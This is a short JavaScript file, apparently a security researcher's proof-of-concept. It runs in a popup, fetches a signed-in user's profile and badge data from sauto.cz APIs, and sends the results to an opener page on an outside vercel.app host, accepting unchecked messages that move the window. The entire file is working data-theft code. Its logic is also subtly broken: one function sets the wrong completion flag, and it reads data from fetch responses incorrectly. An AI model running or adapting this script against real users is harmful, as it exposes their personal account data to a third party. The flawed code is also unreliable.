let getUsersSelfDataComplete = false;
let getUserBadgeDataComplete = false;

window.addEventListener(
    "message",
    (event) => {
        if (event.data.messageType === 'move') {
            window.moveTo(event.data.data.x, event.data.data.y);
        }
    },
    false,
);

setInterval(() => {
    if (getUsersSelfDataComplete && getUserBadgeDataComplete) {
        window.close();
    }
}, 0);

(function getUsersSelfData() {
    fetch('https://www.sauto.cz/api/v1/users/self', {
        method: "GET",
        mode: "cors",
        credentials: "same-origin",
    }).then((response) => {
        window.opener.postMessage(response.data, 'https://whitehat-email-cz.vercel.app/');
        getUsersSelfDataComplete = true;
    }).catch(error => {
        window.opener.postMessage(error, 'https://whitehat-email-cz.vercel.app/')
    });
})();

(function getUserBadgeData() {
    fetch('https://login.sauto.cz/api/v1/user/badge?service=sauto', {
        method: "GET",
        mode: "cors",
        credentials: "same-origin",
    }).then((response) => {
        window.opener.postMessage(response.data, 'https://whitehat-email-cz.vercel.app/');
        getUsersSelfDataComplete = true;
    }).catch(error => {
        window.opener.postMessage(error, 'https://whitehat-email-cz.vercel.app/')
    });
})();

